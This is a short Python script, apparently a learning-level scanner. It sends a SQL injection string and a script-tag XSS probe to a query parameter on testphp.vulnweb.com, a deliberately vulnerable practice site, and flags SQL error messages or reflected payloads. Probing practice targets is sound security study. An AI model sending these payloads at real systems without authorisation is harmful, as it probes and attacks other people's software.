import requests

# Target URL with a parameter to test (example)
target_url = "http://testphp.vulnweb.com/listproducts.php?cat="


# Payloads to test SQL Injection and XSS
payloads = ["' OR '1'='1", "<script>alert('XSS')</script>"]

def test_vuln(url):
    for payload in payloads:
        full_url = url + payload
        print(f"Testing URL: {full_url}")

        try:
            response = requests.get(full_url, timeout=5)
            content = response.text.lower()

            # Simple check for SQL error keywords (common in vulnerable apps)
            if "sql syntax" in content or "mysql" in content or "syntax error" in content:
                print("[!] Possible SQL Injection vulnerability found at:", full_url)

            # Check if XSS payload is reflected in response
            if payload.lower() in content:
                print("[!] Possible XSS vulnerability found at:", full_url)

        except Exception as e:
            print(f"Error testing {full_url}: {e}")

if __name__ == "__main__":
    test_vuln(target_url)
